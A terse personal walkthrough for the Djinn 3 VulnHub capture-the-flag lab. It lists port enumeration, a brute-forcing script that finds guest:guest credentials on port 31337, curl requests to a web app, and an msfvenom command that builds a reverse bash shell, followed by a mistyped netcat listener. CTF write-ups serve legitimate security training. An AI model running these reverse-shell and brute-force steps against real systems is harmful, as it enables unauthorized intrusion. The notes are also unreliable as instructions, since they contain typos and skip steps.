---
{"tags":["walkthrought","vulnhub"],"dg-publish":true,"permalink":"/ctf/vulnhub/djinn-3-walkthrough/","dgPassFrontmatter":true,"noteIcon":""}
---


	#apt install html2text
	#apt install pwn
	host id 192.168.0.105
	port 80 
	5000 python web server
	31337
	git clone  djinn3 walkthrought address
	
	nano brute forcing.py
	change host name to 192.168.0.105
	python3 Brute\ forcing.py
	
	#brute forcing open guest : guest
	nc 192.168.0.105 31337
	help
	open
	y3kh
	y3khexit
	curl -s http://192.168.0.105:5000/ | html2text
	curl -s http://192.168.0.105:5000/?id-3606
	sudo msfvenom -p cmd/unix/reverse_bash lhost=192.168.0.105 lport=4444 -f raw -o revshell.sh
	
	lv -lvnp 4444